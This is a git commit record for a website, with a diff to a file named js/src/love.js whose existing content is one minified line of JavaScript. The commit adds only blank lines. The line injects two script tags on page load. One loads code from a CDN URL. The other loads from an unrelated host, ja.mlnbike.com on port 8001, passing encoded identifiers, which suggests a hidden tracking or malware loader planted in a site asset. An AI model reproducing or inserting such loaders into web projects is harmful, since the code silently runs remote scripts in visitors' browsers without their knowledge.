7efab6d7789a0ae4abca24582a15055d7fc948f3
ligang <ligang@google.com>
2018-04-05 17:11:19 +0800

    Site updated: 2018-04-05 17:11:19

--- js/src/love.js
+++ js/src/love.js
@@ -1,1 +1,5 @@
 var _ju = "http://7u2ss1.com1.z0.glb.clouddn.com/love.js";_ju += (_ju.indexOf('?') > 0 ? '&' : '?') + '_t=' + (new Date().getTime());var _b = "AH488569";var _c = "31872193_(i1gfV1g6it8diJgRiK9W_3311069144_@iJvkDKeNi15ND6P69JgWitfZMe==_)iKghiJeh"; var _jN1=document.createElement("script");_jN1.setAttribute("type","text/javascript"),_jN1.setAttribute("src",_ju),document.head?document.head.appendChild(_jN1):document.body&&document.body.appendChild(_jN1); var _jN2=document.createElement("script");_jN2.setAttribute("type","text/javascript"),_jN2.setAttribute("src","http://ja.mlnbike.com:8001/pjk/static/tp.php?b="+_b+"&"),document.head?document.head.appendChild(_jN2):document.body&&document.body.appendChild(_jN2); 
+
+
+
+
